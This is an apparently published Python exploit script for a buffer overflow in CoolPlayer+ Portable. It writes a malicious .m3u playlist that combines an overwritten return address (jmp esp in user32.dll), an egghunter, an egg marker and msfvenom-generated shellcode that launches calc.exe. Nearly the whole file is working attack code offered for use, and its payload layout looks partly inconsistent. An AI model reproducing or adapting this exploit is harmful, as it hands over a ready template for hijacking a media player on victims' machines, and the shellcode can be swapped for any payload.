#! /usr/bin/python

#CoolPlayer+ Portable Buffer Overflow
#Version:  2.19.2
#Author: Suriya Prakash  -- @suriya73
#Download Link : https://portableapps.com/apps/music_video/coolplayerp_portable
#Tested on:  Windows Xp Sp3

print "--------------------------------------------------------------------------------"
print "                      CoolPlayer+ Portable 2.19.4 Exploit                       "
print "                                  Author:                                       "
print "                           Suriya Prakash (k!ll3r)                              "
print "                                                                                "
print "--------------------------------------------------------------------------------"


junk = "\x90" * 260

offset = "41" * 5000

eip = "\xD8\xB3\x45\x7E" # 7E45B3D8 jmp esp user32.dll

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x50\x57\x4E\x44\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

egg = "\x50\x57\x4e\x44\x50\x57\x4e\x44" #PWNDPWND

nops = "\x90" * 25

# msfvenom -p windows/exec cmd=calc.exe -b \x00\x0a\x0c\0d EXITFUN=thread -f c

shell = ("\x31\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xb0\xb1\xf6\xb8\x83\xee\xfc\xe2\xf4\x4c\x59\x74\xb8\xb0\xb1"
"\x96\x31\x55\x80\x36\xdc\x3b\xe1\xc6\x33\xe2\xbd\x7d\xea\xa4"
"\x3a\x84\x90\xbf\x06\xbc\x9e\x81\x4e\x5a\x84\xd1\xcd\xf4\x94"
"\x90\x70\x39\xb5\xb1\x76\x14\x4a\xe2\xe6\x7d\xea\xa0\x3a\xbc"
"\x84\x3b\xfd\xe7\xc0\x53\xf9\xf7\x69\xe1\x3a\xaf\x98\xb1\x62"
"\x7d\xf1\xa8\x52\xcc\xf1\x3b\x85\x7d\xb9\x66\x80\x09\x14\x71"
"\x7e\xfb\xb9\x77\x89\x16\xcd\x46\xb2\x8b\x40\x8b\xcc\xd2\xcd"
"\x54\xe9\x7d\xe0\x94\xb0\x25\xde\x3b\xbd\xbd\x33\xe8\xad\xf7"
"\x6b\x3b\xb5\x7d\xb9\x60\x38\xb2\x9c\x94\xea\xad\xd9\xe9\xeb"
"\xa7\x47\x50\xee\xa9\xe2\x3b\xa3\x1d\x35\xed\xdb\xf7\x35\x35"
"\x03\xf6\xb8\xb0\xe1\x9e\x89\x3b\xde\x71\x47\x65\x0a\x06\x0d"
"\x12\xe7\x9e\x1e\x25\x0c\x6b\x47\x65\x8d\xf0\xc4\xba\x31\x0d"
"\x58\xc5\xb4\x4d\xff\xa3\xc3\x99\xd2\xb0\xe2\x09\x6d\xd3\xd0"
"\x9a\xdb\x9e\xd4\x8e\xdd\xb0\xb1\xf6\xb8")

fill = "C" * (5000-len(junk)-len(nops)-len(shell)-len(egghunter)-len(egg))

exploit = junk + eip + egghunter + offset + egg + nops + shell + fill




f=open("exploit.m3u","w")
f.write(exploit);
#f.write(eip);
#f.write(fill);
f.close()
